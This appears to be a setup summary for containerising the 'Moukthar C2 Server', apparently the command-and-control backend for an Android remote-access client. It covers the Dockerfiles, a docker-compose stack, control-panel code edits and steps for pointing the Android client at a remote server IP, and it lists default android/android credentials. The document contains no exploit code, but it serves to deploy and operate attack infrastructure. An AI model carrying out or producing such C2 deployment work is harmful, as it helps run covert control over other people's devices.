# Moukthar C2 Server - Docker Setup Summary

## What Was Done

This guide provides a summary of all the Docker setup that has been completed for the Moukthar C2 Server.

### Files Created

#### Docker Configuration Files
- **Dockerfile** - Builds PHP 8.2 Apache image with:
  - PHP extensions (PDO, MySQL)
  - Composer installed
  - Apache mod_rewrite enabled
  - PHP upload limits configured (128MB)
  - c2-server and web-socket dependencies installed

- **Dockerfile.websocket** - Builds PHP 8.2 CLI image for WebSocket server with:
  - Composer installed
  - web-socket dependencies installed
  - Ready to run App.php

- **docker-compose.yml** - Orchestrates three services:
  - MySQL 8.0 database (port 3306)
  - PHP/Apache web server (port 80)
  - WebSocket server (port 8080)
  - All services on same network for internal communication
  - Health checks for database readiness

#### Apache Configuration
- **docker/apache-default.conf** - VirtualHost configuration:
  - Sets DocumentRoot to /var/www/html/c2-server
  - Enables mod_rewrite with proper routing
  - Configures DirectoryIndex to app.php
  - Disables directory listing

- **docker/apache-conf.conf** - Directory permissions:
  - Allows access to /var/www/html
  - Sets AllowOverride All for .htaccess support

#### Documentation
- **QUICK_START.md** - Simple one-command setup guide
- **DOCKER_SETUP.md** - Comprehensive deployment and troubleshooting guide
- **.env.example** - Reference for environment configuration

### Code Modifications

#### PHP Backend
**Server/c2-server/src/Controller/ControlPanel.php**
- Made webSocketURI dynamic using environment variable: `getenv('WEBSOCKET_URI')`
- Added webSocketURI to template data for both `home.php` and `files.php`
- Falls back to `ws://localhost:8080` if env variable not set

**Server/c2-server/src/View/home.php**
- Changed hardcoded `ws://localhost:8080` to dynamic `<?= $webSocketURI ?>`
- WebSocket connection now respects server configuration

**Server/c2-server/src/View/features/files.php**
- Changed hardcoded `ws://localhost:8080` to dynamic `<?= $webSocketURI ?>`
- WebSocket connection now respects server configuration

#### Environment Files
**Server/c2-server/.env**
```
DB_HOST='mysql'
DB_NAME='cc'
DB_USER='android'
DB_PASSWORD='android'
```

**Server/web-socket/.env**
```
DB_HOST='mysql'
DB_NAME='cc'
DB_USER='android'
DB_PASSWORD='android'
```

#### Android Client
**Client/app/src/main/java/com/ot/grhq/client/functionality/Utils.java**
```java
private static final String C2_SERVER = "http://localhost";
public static final String WEB_SOCKET_SERVER = "ws://localhost:8080";
```

## Services Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    Docker Network                        │
│                  (moukthar-network)                      │
├─────────────────────────────────────────────────────────┤
│                                                           │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │   MySQL      │  │  PHP/Apache  │  │  WebSocket   │  │
│  │   :3306      │  │   :80        │  │   :8080      │  │
│  │              │  │              │  │              │  │
│  │ Database     │◄─►  C2 Server  │◄─►   PHP CLI   │  │
│  │              │  │  (Routes)    │  │   (Ratchet) │  │
│  │ cc database  │  │  (Views)     │  │             │  │
│  │              │  │  (Logic)     │  │             │  │
│  └──────────────┘  └──────────────┘  └──────────────┘  │
│        ▲                  ▲                  ▲           │
│        │                  │                  │           │
│  Internal Network    External (Client)  External (Client)│
│        │                  │                  │           │
└────────┼──────────────────┼──────────────────┼───────────┘
         │                  │                  │
     3306:3306           80:80            8080:8080
      (optional)      (Web UI)         (WebSocket)
```

## Default Credentials

| Component | Username | Password |
|-----------|----------|----------|
| C2 Server | android  | android  |
| MySQL     | android  | android  |
| Database  | cc       | -        |

⚠️ Change these for production deployments!

## How to Use

### Quick Start
```bash
cd Server
docker-compose up -d --build
```

### Access Services
- **C2 Server Web UI:** http://localhost
- **WebSocket Server:** ws://localhost:8080
- **MySQL Database:** localhost:3306

### Monitor Services
```bash
docker-compose logs -f              # All logs
docker-compose logs -f php-apache   # Web server logs
docker-compose logs -f mysql         # Database logs
docker-compose logs -f websocket     # WebSocket logs
```

### Stop Services
```bash
docker-compose down
```

## Network Configuration

### Local/Docker (Default)
- C2 Server: `http://localhost`
- WebSocket: `ws://localhost:8080`

### Remote Deployment
To deploy to a remote server (e.g., `192.168.1.100`):

1. Update `docker-compose.yml`:
```yaml
environment:
  WEBSOCKET_URI: 'ws://192.168.1.100:8080'
```

2. Update `Client/app/src/main/java/com/ot/grhq/client/functionality/Utils.java`:
```java
private static final String C2_SERVER = "http://192.168.1.100";
public static final String WEB_SOCKET_SERVER = "ws://192.168.1.100:8080";
```

3. Deploy:
```bash
docker-compose up -d --build
```

## Key Features

✅ **Automated Setup** - Single command to start all services
✅ **Database Initialization** - Automatic SQL import on startup
✅ **Health Checks** - Services wait for dependencies before starting
✅ **Network Isolation** - Services communicate on internal network
✅ **Port Mapping** - All services exposed for external access
✅ **Volume Persistence** - MySQL data persists between restarts
✅ **Development Ready** - Source volumes for live code updates
✅ **Production Friendly** - Can be deployed to any Linux server with Docker

## Common Operations

| Task | Command |
|------|---------|
| Start services | `docker-compose up -d --build` |
| Stop services | `docker-compose down` |
| View logs | `docker-compose logs -f [service]` |
| Access MySQL | `docker-compose exec mysql mysql -u android -pcs` |
| Rebuild images | `docker-compose down && docker-compose up -d --build` |
| Check status | `docker-compose ps` |

## Troubleshooting

### MySQL won't connect
- Wait 30-60 seconds for MySQL to initialize
- Check: `docker-compose logs mysql`
- Restart: `docker-compose restart mysql`

### WebSocket connection fails
- Verify container running: `docker-compose ps websocket`
- Check logs: `docker-compose logs websocket`
- Verify port: `docker-compose port websocket 8080`

### Port already in use
- Modify port mappings in `docker-compose.yml`
- Update client configuration to use new ports

For detailed troubleshooting, see [DOCKER_SETUP.md](DOCKER_SETUP.md).

## Security Considerations

### For Development
Current setup is suitable for local development and testing.

### For Production
- [ ] Change default credentials in `docker-compose.yml`
- [ ] Update `.env` files with strong passwords
- [ ] Configure HTTPS/WSS with reverse proxy (nginx/Apache)
- [ ] Use environment variables or secrets management
- [ ] Restrict port access with firewall rules
- [ ] Enable database backups
- [ ] Monitor logs and implement alerting
- [ ] Keep Docker images updated

## File Structure

```
Server/
├── c2-server/              # PHP C2 Server Application
├── web-socket/             # WebSocket Server Application
├── database.sql            # Database Schema
├── Dockerfile              # Main Docker image
├── Dockerfile.websocket    # WebSocket Docker image
├── docker-compose.yml      # Service orchestration
├── docker/
│   ├── apache-default.conf
│   └── apache-conf.conf
├── .env.example            # Environment reference
├── QUICK_START.md          # Quick setup guide
├── DOCKER_SETUP.md         # Complete setup guide
└── SETUP_SUMMARY.md        # This file
```

## Next Steps

1. **Start services:** `docker-compose up -d --build`
2. **Verify operation:** Check http://localhost
3. **Review logs:** `docker-compose logs`
4. **Configure client:** Update Android client with server IP (if remote)
5. **Test connectivity:** Verify WebSocket connection works
6. **Plan deployment:** Use DOCKER_SETUP.md for production setup

---

For questions or issues, refer to [DOCKER_SETUP.md](DOCKER_SETUP.md) for comprehensive documentation.
